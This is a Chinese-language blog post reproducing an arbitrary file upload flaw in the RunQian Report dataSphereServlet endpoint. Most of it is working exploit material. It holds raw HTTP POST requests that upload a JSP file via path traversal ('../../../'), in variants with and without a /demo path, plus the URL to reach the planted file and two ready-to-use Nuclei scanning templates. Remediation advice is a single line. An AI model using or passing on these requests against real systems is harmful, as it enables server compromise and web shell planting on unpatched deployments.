#  【漏洞复现】润乾报表dataSphereServlet接口 任意文件上传漏洞   
紫色皓月  皓月的笔记本   2024-07-27 10:00  
  
声明：请勿将文章内的相关技术用于非法目的，如有相关非法行为与文章作者和本公众号无关。  
  
0X01   
简介  
  
润乾报表是一个纯JAVA的企业级报表工具，支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，支持各种常见的关系数据库和各类J2 EE的应用服务器，客户端采用标准纯html方式展现，支持ie和netscape， 润乾报表是领先的企业级报表分析软件。它提供了高效的报表设计方案、强大的报表展现能力、灵活的部署机制，支持强关联语义模型，并且具备强有力的填报功能和olap分析，为企业级数据分析与商业智能提供了高性能、高效率的报表系统解决方案。  
  
  
漏洞编号：  
  
无  
  
  
影响范围：  
  
无  
  
  
复现环境：  
  
润乾报表 20221210  
  
  
0X02   
漏洞复现  
  
注：新搭建系统存在demo路径，网上查询已搭建好的部分不存在demo路径，poc给出两个方案。  
  
存在demo路径POC：  
```
POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 392
Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="openGrpxFile"; filename="539634.jsp"
Content-Type: text/plain

<% out.println("123456"); %>
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="path"

../../../
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="saveServer"

1
--eac629ee4641cb0fe10596fba5e0c5d9--
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPK1dO92R1xSDbj53SUx9VTqG6OGSmibSMYMOoibiaChgn7AL7DIUTPQuVvwS0EAkXUhsk4dOqmACUctg/640?wx_fmt=jpeg&from=appmsg "")  
```
http://192.168.31.133:6868/demo/539634.jsp
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPK1dO92R1xSDbj53SUx9VTq9mFaRicnQ7XwEzoGB7kqnlwDkTMTRNHQsSczAzlCEHGfNXlVV28GEGg/640?wx_fmt=jpeg&from=appmsg "")  
  
Nuclei：  
```
id: runqianbaobiaowenjianshangchuan-DEMO

info:
  name: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  author: 紫色皓月
  severity: high
  description: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  tags: 2024,润乾报表,任意文件上传,DEMO

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
  file_content: "{{to_lower(rand_text_numeric(32))}}"

requests:
  - raw:
    - |
      POST /demo/servlet/dataSphereServlet?action=38 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
      Content-Length: 395
      Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="openGrpxFile"; filename="{{file_name}}"
      Content-Type: text/plain

      {{file_content}}
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="path"

      ../../../
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="saveServer"

      1
      --eac629ee4641cb0fe10596fba5e0c5d9--

    - |
      GET /demo/{{file_name}} HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: 1

    req-condition: true
    matchers:
      - type: word
        words:
          - "{{file_content}}"
        part: body
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4axEiaIyhaPK1dO92R1xSDbj53SUx9VTqiavDYgyGk4eiagMSX5U3UmtlIdI3lb9YDMqsfWJah89LdqNK4sNJPMfA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
无demo路径：  
```
POST /servlet/dataSphereServlet?action=38 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 392
Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="openGrpxFile"; filename="539634.jsp"
Content-Type: text/plain

<% out.println("123456"); %>
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="path"

../../../
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="saveServer"

1
--eac629ee4641cb0fe10596fba5e0c5d9--

http://192.168.31.133:6868/539634.jsp

nuclei：
id: runqianbaobiaowenjianshangchuan

info:
  name: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  author: 紫色皓月
  severity: high
  description: 润乾报表dataSphereServlet接口存在任意文件上传漏洞
  tags: 2024,润乾报表,任意文件上传

variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.txt"
  file_content: "{{to_lower(rand_text_numeric(32))}}"

requests:
  - raw:
    - |
      POST /servlet/dataSphereServlet?action=38 HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
      Accept-Encoding: gzip, deflate
      Accept: */*
      Connection: close
      Content-Length: 395
      Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="openGrpxFile"; filename="{{file_name}}"
      Content-Type: text/plain

      {{file_content}}
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="path"

      ../../../
      --eac629ee4641cb0fe10596fba5e0c5d9
      Content-Disposition: form-data; name="saveServer"

      1
      --eac629ee4641cb0fe10596fba5e0c5d9--

    - |
      GET /{{file_name}} HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      Connection: close
      Upgrade-Insecure-Requests: 1

    req-condition: true
    matchers:
      - type: word
        words:
          - "{{file_content}}"
        part: body
```  
  
  
  
0X03 修复建议  
  
升级至安全版本！  
  
  
0X04 写在最后  
  
  
回复“加群”，获取群号。  
  
侵删！  
  
  
